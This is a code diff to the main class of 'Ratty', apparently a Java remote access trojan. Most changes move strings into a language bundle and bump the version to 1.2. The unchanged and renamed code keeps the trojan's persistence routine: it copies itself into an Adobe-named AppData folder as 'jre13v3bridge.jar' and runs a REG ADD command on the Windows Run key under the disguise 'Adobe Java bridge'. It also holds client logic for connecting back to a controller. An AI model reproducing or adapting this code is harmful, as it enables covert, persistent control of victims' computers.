@@ -4,6 +4,7 @@ import java.io.File;
 import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
+import java.util.ResourceBundle;
 
 import javax.swing.JDialog;
 import javax.swing.JFrame;
@@ -19,24 +20,26 @@ import de.sogomn.rat.server.gui.RattyGuiController;
 
 public final class Ratty {
 	
+	public static final boolean DEBUG = true;
+	public static final String VERSION = "1.2";
+	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
+	
 	private static String address;
 	private static int port;
 	private static boolean client;
 	
-	private static final boolean DEBUG = true;
-	
-	private static final String PORT_INPUT_MESSAGE = "Which port should the server be bind to?";
-	
 	private static final int CONNECTION_INTERVAL = 2500;
 	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
-	
 	private static final String STARTUP_FOLDER_NAME = "Adobe" + File.separator + "AIR";
 	private static final String STARTUP_FILE_NAME = "jre13v3bridge.jar";
 	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + STARTUP_FOLDER_NAME + File.separator + STARTUP_FILE_NAME;
 	private static final String STARTUP_COMMAND = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java.exe";
-	private static final String REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_COMMAND + " " + STARTUP_FILE_PATH + "\"";
+	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_COMMAND + " " + STARTUP_FILE_PATH + "\"";
 	
-	public static final String VERSION = "1.1";
+	private static final String PORT_INPUT_MESSAGE = LANGUAGE.getString("server.port_message");
+	private static final String DEBUG_MESSAGE = LANGUAGE.getString("debug.question");
+	private static final String DEBUG_SERVER = LANGUAGE.getString("debug.server");
+	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
 	
 	private Ratty() {
 		//...
@@ -74,7 +77,7 @@ public final class Ratty {
 			
 			FileUtils.createFile(STARTUP_FILE_PATH);
 			FileUtils.copyFile(source, destination);
-			Runtime.getRuntime().exec(REGISTRY_COMMAND);
+			Runtime.getRuntime().exec(STARTUP_REGISTRY_COMMAND);
 		} catch (final URISyntaxException | IOException ex) {
 			ex.printStackTrace();
 		}
@@ -131,15 +134,15 @@ public final class Ratty {
 		readConnectionData();
 		
 		if (DEBUG) {
-			final String[] options = {"Server", "Client"};
-			final int input = JOptionPane.showOptionDialog(null, "Server or client?", null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
+			final String[] options = {DEBUG_SERVER, DEBUG_CLIENT};
+			final int input = JOptionPane.showOptionDialog(null, DEBUG_MESSAGE, null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
 			
 			if (input == JOptionPane.YES_OPTION) {
-				System.out.println("Server");
+				System.out.println(DEBUG_SERVER);
 				
 				startServer(port);
 			} else if (input == JOptionPane.NO_OPTION) {
-				System.out.println("Client");
+				System.out.println(DEBUG_CLIENT);
 				
 				connectToHost(address, port);
 			}
